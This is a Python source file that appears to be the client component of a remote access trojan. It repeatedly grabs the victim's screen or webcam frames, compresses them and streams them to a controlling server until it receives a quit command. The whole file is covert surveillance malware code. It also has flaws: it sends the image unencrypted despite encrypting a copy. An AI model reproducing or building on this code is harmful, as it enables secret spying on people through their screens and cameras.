import numpy as np
import cv2

from PIL import ImageGrab, Image
from tkinter import Tk


class ImageCapture:
    """
    A screen capture on the client side that capture images of the screen and send it one after another to the client
    """

    def __init__(self, rat_client):
        self.symmetric_encryption = rat_client.symmetric_encryption
        self.rat_client = rat_client
        self.cam = cv2.VideoCapture(0)
        print("Initiated ImageCapturer")


    def sendImage(self, img): # device - screen or camera
        """
        this function take a screenshot and send it to the server
        """

        # self.my_socket.send(b'recvLargeData')
        print("read img to bytes")
        encrypted_img = self.symmetric_encryption.encrypt(img)
        print('len: ', str(len(encrypted_img)).encode())
        print('encrypted: ', self.symmetric_encryption.encrypt(str(len(encrypted_img)).encode()))
        self.rat_client.send(str(len(encrypted_img)).encode())
        print("sent img size")
        print('hereeeeee: ',self.rat_client.my_socket.recv(1024))
        print("recieved confirmation")
        self.rat_client.send(img)
        print("sent img: ", encrypted_img)
        print("Screen Image Sent!")
        # self.my_socket.recv(1024)


    def run(self, device): # device - screen or camera
        root = Tk()
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        root.destroy()
        finished = False

        while not finished:
            if device == 'camera':
                try:
                    _, frame = self.cam.read()
                except Exception as e:
                    print("The problem is: ", e)
                print(type(frame))
                if frame is not None:
                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
                    compress_img = cv2.imencode('.jpg', frame, encode_param)[1]
                    data = compress_img.tostring()
                    self.sendImage(data)
                else:
                    self.sendImage(b'Could not use camera')
            elif device == 'screen':
                img = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))  # bbox specifies specific region (bbox= x,y,width,height)
                resize_percentage = 0.5
                img_width, img_height = int(screen_width * resize_percentage), int(screen_height * resize_percentage)
                img = img.resize((img_width, img_height), Image.ANTIALIAS)
                img_np = np.array(img)
                frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
                compress_img = cv2.imencode('.jpg', frame, encode_param)[1]
                data = compress_img.tostring()
                print(type(frame))

                self.sendImage(data)

            answer = self.rat_client.recv(1024).decode()
            print("ANSWER: ", answer)
            if answer == "quit":
                finished = True


def main():
    pass

if __name__ == "__main__":
    main()
